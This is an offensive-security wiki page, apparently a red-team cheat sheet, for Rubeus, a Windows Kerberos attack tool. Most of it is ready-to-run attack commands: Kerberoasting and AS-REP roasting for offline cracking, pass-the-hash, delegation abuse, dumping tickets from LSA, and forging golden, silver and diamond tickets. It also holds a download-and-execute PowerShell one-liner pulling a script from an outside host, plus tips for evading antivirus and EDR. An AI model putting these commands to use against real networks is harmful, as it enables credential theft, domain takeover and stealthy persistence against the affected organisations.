---
title: "Rubeus"
type: tool
tags: [active-directory, kerberos, credentials, roasting, delegation, golden-ticket, post-exploitation, windows]
date_created: 2026-07-02
date_updated: 2026-07-02
sources: [github-ghostpack-rubeus, harmj0y-rubeus]
phase: postex
---

## Purpose

**Rubeus** is a C# toolset for raw Kerberos interaction and abuse on Windows. It requests and manages tickets (TGTs/STs), performs Kerberoasting and AS-REP roasting, abuses constrained/unconstrained/resource-based delegation via S4U, extracts a usable TGT for the current user (`tgtdeleg`), harvests and monitors tickets from LSA, changes passwords over kpasswd, and forges golden, silver, and diamond tickets. It is the Windows counterpart to Impacket's `getTGT.py` / `GetUserSPNs.py` / `getST.py` / `ticketer.py`.

## Installation

Rubeus ships as source; you run a compiled binary or load the assembly in memory.

```bash
# Build from source (on a Windows dev box)
msbuild Rubeus.sln /p:Configuration=Release
# -> Rubeus\bin\Release\Rubeus.exe
```

Precompiled binaries are commonly pulled from SharpCollection (Flangvik). On an engagement Rubeus is usually run without touching disk:

```
# Cobalt Strike / Sliver: execute-assembly Rubeus.exe <args>
# PowerShell reflective load (PowerSharpPack / Invoke-Rubeus)
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.6/Invoke-Rubeus.ps1')
Invoke-Rubeus -Command "kerberoast /nowrap"
```

Rubeus needs the .NET Framework present on the target (default on modern Windows). Run `Rubeus.exe` with no arguments to list every command.

## Core usage

General form: `Rubeus.exe <command> [/flag:value ...]`. Common cross-command flags: `/domain:`, `/dc:`, `/user:`, secret material as `/password:` `/rc4:` `/aes128:` `/aes256:` `/des:`, `/ticket:` (base64 blob or `.kirbi` path), `/ptt` (inject the result into the current logon session), `/nowrap` (do not line-wrap base64, required for clean copy-paste), `/outfile:`, `/format:hashcat|john`.

### Request a TGT (asktgt)

```
# Password
Rubeus.exe asktgt /user:jdoe /password:Password123! /domain:corp.local /dc:dc01.corp.local /nowrap

# Overpass-the-hash / pass-the-key (NT hash or AES key instead of password)
Rubeus.exe asktgt /user:jdoe /rc4:<ntlm_hash> /ptt
Rubeus.exe asktgt /user:jdoe /aes256:<aes256_key> /ptt

# PKINIT: certificate -> TGT (pairs with certipy/certify output)
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:pfxpass /ptt

# UnPAC-the-hash: recover the account NT hash via PKINIT
Rubeus.exe asktgt /user:jdoe /certificate:jdoe.pfx /getcredentials /show /nowrap
```

Request a service ticket from a TGT:

```
Rubeus.exe asktgs /ticket:<base64_TGT> /service:cifs/dc01.corp.local /ptt
```

### Kerberoast

```
# Roast every SPN-bearing account the current user can see
Rubeus.exe kerberoast /outfile:hashes.txt

# Single account / single SPN, unwrapped for cracking
Rubeus.exe kerberoast /user:svc_sql /domain:corp.local /nowrap
Rubeus.exe kerberoast /spn:MSSQLSvc/sql01.corp.local:1433 /nowrap

# Opsec: only request RC4 tickets and skip AES-only accounts (keeps hashes crackable, fewer anomalies)
Rubeus.exe kerberoast /rc4opsec

# Roast without valid domain creds in context, using the tgtdeleg trick
Rubeus.exe kerberoast /tgtdeleg

# Enumerate roastable accounts without requesting tickets
Rubeus.exe kerberoast /stats
```

TGS-REP hashes crack with hashcat mode 13100.

### AS-REP roast

```
Rubeus.exe asreproast /outfile:asrep.txt
Rubeus.exe asreproast /user:jdoe /domain:corp.local /format:hashcat /nowrap
```

AS-REP hashes crack with hashcat mode 18200. If hashcat rejects the hash, adjust the prefix from `$krb5asrep$23$` to `$krb5asrep$23$user@domain`.

### S4U (delegation abuse)

```
# Constrained delegation: service account with msDS-AllowedToDelegateTo
Rubeus.exe s4u /user:websvc$ /rc4:<hash> /impersonateuser:administrator \
  /msdsspn:cifs/dc01.corp.local /ptt

# From an existing TGT, rewrite the final SPN via /altservice (SPN not validated in the ST)
Rubeus.exe s4u /ticket:<base64_TGT> /impersonateuser:administrator \
  /msdsspn:cifs/dc01.corp.local /altservice:host,ldap /ptt

# RBCD: after writing msDS-AllowedToActOnBehalfOfOtherIdentity on the target
Rubeus.exe s4u /user:attacker$ /aes256:<key> /impersonateuser:administrator \
  /msdsspn:cifs/target.corp.local /ptt
```

### tgtdeleg

```
Rubeus.exe tgtdeleg /nowrap
```

Uses the Kerberos GSS-API delegation trick to extract a forwardable TGT for the current user without their password and without elevation. Feed the resulting ticket into `s4u` or `kerberoast /tgtdeleg`.

### Ticket management (ptt, dump, describe)

```
Rubeus.exe ptt /ticket:ticket.kirbi          # inject a ticket
Rubeus.exe klist                             # list tickets in the current session
Rubeus.exe describe /ticket:ticket.kirbi     # decode a ticket (times, flags, enc type)
Rubeus.exe purge                             # drop tickets from the current session
Rubeus.exe dump /nowrap                      # extract tickets from LSA (elevation needed for other sessions)
Rubeus.exe dump /service:krbtgt /nowrap
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show   # sandboxed logon session for injected tickets
```

### Monitor / harvest

```
Rubeus.exe monitor /interval:5 /nowrap                 # watch for new TGTs (e.g. after coercion of a DC)
Rubeus.exe monitor /interval:5 /filteruser:targetuser
Rubeus.exe harvest /interval:30                         # harvest and auto-renew TGTs
```

`monitor`, `harvest`, and full `dump` read the LSA and require local admin / SYSTEM.

### changepw (kpasswd)

```
# Change the password for the account the TGT belongs to
Rubeus.exe changepw /ticket:<base64_TGT> /new:NewPass123! /dc:dc01.corp.local

# Targeted reset using a privileged ticket (e.g. after shadow credentials / RBCD)
Rubeus.exe changepw /ticket:<base64_TGT> /targetuser:corp.local\victim /targetdc:dc01 /new:NewPass123!
```

### Golden / silver / diamond tickets

```
# Golden ticket (needs the krbtgt hash/key)
Rubeus.exe golden /rc4:<krbtgt_rc4> /user:administrator /id:500 \
  /domain:corp.local /sid:S-1-5-21-... /ptt
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:administrator \
  /domain:corp.local /sid:S-1-5-21-... /ldap /ptt      # /ldap auto-fills domain SID and policy from a DC

# Silver ticket (needs the service/machine account hash; forges an ST for one service)
Rubeus.exe silver /service:cifs/dc01.corp.local /rc4:<machine_hash> \
  /user:administrator /domain:corp.local /sid:S-1-5-21-... /ptt

# Diamond ticket (request a real TGT, decrypt with krbtgt key, edit the PAC, re-encrypt)
Rubeus.exe diamond /krbkey:<krbtgt_aes256> /enctype:aes \
  /user:jdoe /password:Password123! \
  /ticketuser:administrator /ticketuserid:500 /groups:512 \
  /dc:dc01.corp.local /ptt
```

## Common use cases

- Kerberoasting SPN accounts for offline cracking: [[roasting-kerberoasting]].
- AS-REP roasting accounts without Kerberos pre-auth: [[roasting-asrep-roasting]].
- Overpass-the-hash / pass-the-key to obtain a TGT from a hash or AES key: [[hash-overpass-the-hash]], [[hash-pass-the-key]].
- Delegation abuse via S4U (constrained, RBCD, unconstrained): [[kerberos-delegation-constrained-delegation]], [[kerberos-delegation-resource-based-constrained-delegation]], [[kerberos-delegation-unconstrained-delegation]], [[kerberos-service-for-user-extension]].
- Golden, silver, and diamond ticket forgery for persistence and DC access: [[ad-persistence]], [[kerberos-tickets]], [[kerberos-attacks]].
- UnPAC-the-hash: turn a certificate (from ADCS abuse) into the account NT hash, chaining from [[active-directory-certificate-esc-attacks]] and the [[certipy]] / [[certify]] output.
- Capturing coerced TGTs with `monitor` after a forced authentication: [[internal-coerce]].
- Ticket reuse for lateral movement: [[ad-lateral-movement]].

## Tips and gotchas

- Always add `/nowrap` when you intend to copy base64 out; wrapped output breaks `ptt`/import.
- `/ptt` injects into your current logon session and can clobber your own tickets. Use `createnetonly` to spawn an isolated session (the `runas /netonly` equivalent) and inject there.
- `tgtdeleg` does not need elevation (it runs as the current user); `dump` of other sessions, `monitor`, and `harvest` do need local admin / SYSTEM.
- Hashcat modes: 13100 for TGS-REP (Kerberoast), 18200 for AS-REP.
- Encryption downgrade: default Kerberoast may pull AES tickets that are slower to crack. `/rc4opsec` requests RC4 and skips AES-only accounts, but modern DCs may log RC4 requests as anomalous.
- Clock skew above five minutes causes `KRB_AP_ERR_SKEW`. Sync time (`w32tm /resync` or `net time`) before `asktgt` against a remote DC.
- Golden versus diamond: a golden ticket is fully forged and has no matching AS-REQ on the DC (detectable), while a diamond ticket modifies a genuinely issued TGT (stealthier, correct ticket times). A sapphire ticket is a diamond that copies a real high-privilege account's PAC.
- `asktgt /certificate /getcredentials` performs UnPAC-the-hash and returns the NTLM hash over PKINIT; pair it with certificates from ADCS abuse.
- `s4u /altservice` exploits that the service name inside the ST is not validated: request an ST for any allowed SPN, then rewrite the service portion (for example `cifs`, `host`, `ldap`, `http`).
- Rubeus is heavily signatured by AV/EDR. Run it via `execute-assembly`/in-memory loaders, and note that broad Kerberoasting fires many TGS-REQs (noisy).

## Related

- [[mimikatz]] : the classic alternative for ticket dumping and golden/silver forgery.
- [[impacket]] : Linux equivalents (`getTGT.py`, `GetUserSPNs.py`, `getST.py`, `ticketer.py`).
- [[certipy]] / [[certify]] : ADCS abuse producing certificates that Rubeus turns into TGTs.
- [[bloodhound]] : find the delegation and roasting paths that Rubeus then exploits.

## Sources

- GhostPack/Rubeus README: https://github.com/GhostPack/Rubeus
- harmj0y, "Rubeus, Now With More Kekeo" and "From Kekeo to Rubeus" (posts.specterops.io / blog.harmj0y.net)
